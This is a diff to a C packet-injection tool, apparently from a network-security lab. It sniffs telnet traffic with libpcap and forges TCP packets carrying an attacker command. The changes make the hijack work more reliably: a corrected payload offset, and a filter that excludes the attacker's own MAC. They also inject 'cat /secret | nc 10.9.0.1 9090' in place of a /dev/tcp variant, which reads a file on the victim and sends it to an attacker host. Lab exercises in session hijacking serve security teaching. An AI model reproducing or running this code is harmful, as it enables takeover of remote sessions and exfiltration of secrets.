@@ -19,7 +19,7 @@
 	typedef struct {                                                           \
 		Header_T header;                                                       \
 		u_char data[];                                                         \
-	} __attribute__((packed)) Name
+	} Name
 
 PACKET(eth_t, struct ether_header);
 PACKET(ip_t, struct iphdr);
@@ -57,18 +57,23 @@ typedef struct {
 
 void send_modified_packet(u_char *pkt_buf, const char *cmd) {
 	eth_t *eth = (eth_t *)pkt_buf;
-	if (ntohs(eth->header.ether_type) != ETHERTYPE_IP)
+	if (ntohs(eth->header.ether_type) != ETHERTYPE_IP) {
+		printf("Something wrong with packet at ethernet layer\n");
 		return;
+	}
 
 	ip_t *ip = (ip_t *)eth->data;
-	if (ip->header.protocol != IPPROTO_TCP)
+	if (ip->header.protocol != IPPROTO_TCP) {
+		printf("Not a TCP packet.\n");
 		return;
+	}
 
 	tcp_t *tcp = (tcp_t *)ip->data;
 
-	u_char *payload_ptr = tcp->data;
+	u_char *payload_ptr = (u_char *)tcp + tcp->header.doff * 4;
 	u_int cmd_len = strlen(cmd);
-	memcpy(tcp->data, cmd, cmd_len);
+
+	memcpy(payload_ptr, cmd, cmd_len);
 
 	int total_ip_len = sizeof(ip_t) + sizeof(tcp_t) + cmd_len;
 	ip->header.tot_len = htons(total_ip_len);
@@ -95,7 +100,6 @@ void send_modified_packet(u_char *pkt_buf, const char *cmd) {
 	tcp->header.check = in_checksum((unsigned short *)pseudo_buff,
 									sizeof(psh_t) + tcp_segment_len);
 
-	// 7. Send packet using AF_INET raw socket (Kernel handles Link Layer)
 	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 	if (sock < 0) {
 		perror("Socket creation failed");
@@ -129,14 +133,14 @@ void send_modified_packet(u_char *pkt_buf, const char *cmd) {
 
 void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
 			   const u_char *packet) {
-	u_char *pkt_copy = malloc(header->caplen);
+	const char *command = "\r cat /secret | nc 10.9.0.1 9090 \r\n";
+
+	u_char *pkt_copy = malloc(header->caplen + strlen(command));
 	if (pkt_copy) {
 		memcpy(pkt_copy, packet, header->caplen);
 	}
 
-	const char *new_payload = "\r cat /secret > /dev/tcp/10.9.0.1/9090 \r\n";
-
-	send_modified_packet(pkt_copy, new_payload);
+	send_modified_packet(pkt_copy, command);
 
 	free(pkt_copy);
 }
@@ -170,6 +174,8 @@ char *find_bridge_interface(pcap_if_t *alldevsp) {
 	return NULL;
 }
 
+#define ATTACKER_MAC "02:42:78:b1:80:31"
+
 int main() {
 	pcap_if_t *alldevsp = NULL;
 	char err_buff[PCAP_ERRBUF_SIZE] = {0};
@@ -178,7 +184,8 @@ int main() {
 	char *bridge_iface = find_bridge_interface(alldevsp);
 
 	pcap_t *handle = pcap_open_live(bridge_iface, 262144, 1, 1000, err_buff);
-	apply_filter(handle, "tcp dst port 23");
+	apply_filter(handle,
+				 "(tcp dst port 23) and not (ether src " ATTACKER_MAC ")");
 
 	printf("Running on interface %s\n", bridge_iface);
 
